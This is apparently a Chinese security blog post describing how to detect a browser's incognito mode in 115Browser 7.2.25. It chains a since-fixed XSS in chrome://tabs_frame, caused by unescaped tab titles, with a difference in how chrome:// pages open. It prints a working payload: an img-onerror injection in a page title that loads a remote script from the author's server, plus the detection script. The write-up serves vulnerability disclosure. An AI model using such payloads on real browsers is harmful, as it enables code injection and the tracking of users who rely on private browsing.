---
layout: post
title: Chromium 内核浏览器下的隐身模式追踪
---
#### 0x01 隐身模式

隐身模式会打开一个新窗口，以便在其中以私密方式浏览互联网，而不让浏览器记录访问的网站，当关闭隐身窗口后也不会留下 Cookie 等其他痕迹。用户可以在隐身窗口和所打开的任何常规浏览窗口之间进行切换，用户只有在使用隐身窗口时才会处于隐身模式，本文将简单的谈一下基于模式差异化的攻击方法。

#### 0x02 浏览器模式的差异化

做过浏览器指纹检测的可能知道使用不同的函数方法或者 DOM 来判断指纹，想要判断目标浏览器当前处于隐身模式还是正常模式，当然也需要找出两种模式下的差异化在哪里，之后使用脚本或其他方法去判断。虽然隐身模式不能用传统那些探测指纹的方法来判断，但我在之前使用隐身模式的过程中发现，当用户输出访问某些 ChromeURL 的时候浏览器不会在当前模式下打开，例如：chrome://settings/manageProfile, chrome://history, chrome://extensions/ 等。这个差异很大的原因可能是隐私模式下对于 extensions, history, profile... 不关联信息时做出的不同处理，利用这个“特性”我想能够做些事情。

#### 0x03 Vuln + Feature

现在我们的理想攻击流程：

- 获取浏览器当前 Title/location.href/Tabs 等信息；
- 使用 JavaScript 打开上面测试存在差异化的 URL ；
- 判断用户目前的浏览器模式是否存在这个微妙的不同；

拿 115Browser 7.2.25 举例，当我们在隐私模式下打开 chrome://settings 时，浏览器启动了一个正常浏览器的进程：

![https://wx4.sinaimg.cn/large/c334041bgy1fbw2btikbsj20k10fzta0.jpg](https://wx4.sinaimg.cn/large/c334041bgy1fbw2btikbsj20k10fzta0.jpg)

我们知道是不能从非 chrome 协议直接 href 跨到浏览器域的：

	location.href='chrome://settings'
	"chrome://settings"
	testchrome.html:1 Not allowed to load local resource: chrome://settings/

所以这里我去寻找一个 chrome 域的跨站漏洞，这个 115 Chrome 域下的漏洞（已修复）位于 chrome://tabs_frame ，页面 DOM 动态渲染网站 TABS Title 时过滤不严谨导致的跨站：

	  var tpl = '<li><span>{title}</span><span class="close"></span></li>',
	    dom = {
	      list: document.getElementsByTagName('ul')[0],
	      index: -1,
	      doc: document
	    },
	    //jQuery,迭代得到当前元素在某个方向上的元素集合
	    dir = function(elem, dir) {
	      var matched = [],
	        cur = elem[dir];
	
	      while (cur && cur.nodeType !== 9) {
	        if (cur.nodeType === 1) {
	          matched.push(cur);
	        }
	        cur = cur[dir];
	      }
	      return matched;
	    };

	...
	
	  //callback：获取当前打开的标签并显示
	  OOF_GET_TAB_LIST = function(str) {
	    var json = JSON.parse(str),
	      tabList = [];
	    for (var i = json.length - 1; i >= 0; i--) {
	      tabList.unshift(tpl.replace(/{(\w+)}/g, function(match, key) {
	        return json[i][key];
	      }));
	    }
	    dom.list.innerHTML = tabList.join("");
	  }

现在我们能够按照上面的思路来进行判断了，这里我为了方便直接使用 115浏览器的 browserInterface.GetTabList 接口来获取 TABS 的差异化：

	browserInterface.GetTabList
	function(callback) {
		native function NativeGetTabList();
		return NativeGetTabList(callback);
	}
	
这个方法接收回调函数获取当前浏览器的 TABS 信息：

![https://wx4.sinaimg.cn/large/c334041bgy1fbw2i4vgowj20ni0703zn.jpg](https://wx4.sinaimg.cn/large/c334041bgy1fbw2i4vgowj20ni0703zn.jpg)

#### 0x04 Payload

http://server.n0tr00t.com/chrome/check_incognito_mode.html

	<!DOCTYPE HTML>
	<html>
	<head>
	    <title><img src=@ style="display: none;" onerror="a=document.createElement('script');a.src='http://server.n0tr00t.com/chrome/checkwindow.js?'+new Date().getTime();a.id='abc';document.body.appendChild(a);">
	    </title>
	</head>
	    <body>
	    TEST Chromeium Incognito Window
	    </body>
	</html>

http://server.n0tr00t.com/chrome/checkwindow.js

	/**
	 * Author: evi1m0.bat[at]gmail.com
	 * Check Chromium Browser Incognito Window
	 **/
	
	initCount = function(){
	    location.href = 'chrome://settings/';
	}
	
	check = function(){
	    if(window.data.indexOf('"href":"chrome://settings/"') < 0){
	        document.body.innerHTML = 'Chrome Incognito Window!!!';
	    } else {
	        document.body.innerHTML = 'Chrome Normal :)'; 
	    }
	}
	
	setTimeout("initCount()", 100);
	callback = function(data){window.data = data};
	browserInterface.GetTabList('callback');
	setTimeout("check()", 1000);

正常模式网页浏览和隐身模式网页的浏览图：
	
![https://wx3.sinaimg.cn/large/c334041bgy1fbw2qorqknj20ya0nwgny.jpg](https://wx3.sinaimg.cn/large/c334041bgy1fbw2qorqknj20ya0nwgny.jpg)

#### 0x05 EOF

通过漏洞和特性的利用我们成功的实现了对浏览器隐身模式的追踪，在测试过程中发现有些浏览器 chrome://...url 是禁用的，但依然能够他们本身浏览器使用的伪协议来实现差异化的跳转（例如 QQ 浏览器的 qqbrowser:// ），这种特性虽然需要一个漏洞来配合利用，不过我认为相比之下难度着实小了许多。